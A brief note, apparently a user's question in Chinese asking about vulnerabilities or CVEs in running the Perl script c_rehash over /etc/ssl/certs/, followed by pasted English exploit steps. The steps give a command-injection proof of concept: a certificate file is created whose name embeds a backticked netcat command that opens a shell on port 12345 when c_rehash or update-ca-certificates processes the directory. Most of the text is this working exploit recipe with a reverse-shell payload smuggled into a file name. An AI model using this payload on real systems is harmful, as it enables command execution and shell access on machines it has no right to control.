用perl执行了一个脚本perl /usr/bin/c_rehash，并用这个脚本遍历了/etc/ssl/certs/证书库，找一下相关的漏洞或者是cve

Navigate to /etc/ssl/certs/ (default) or other paths configured in update-ca-certificates
echo "-----BEGIN CERTIFICATE-----" > "hey.crt\`nc -c sh 127.0.0.1 12345\`" (nc as payload example)
Then wait until execution of update-ca-certificates. You can trigger it manually with c_rehash .
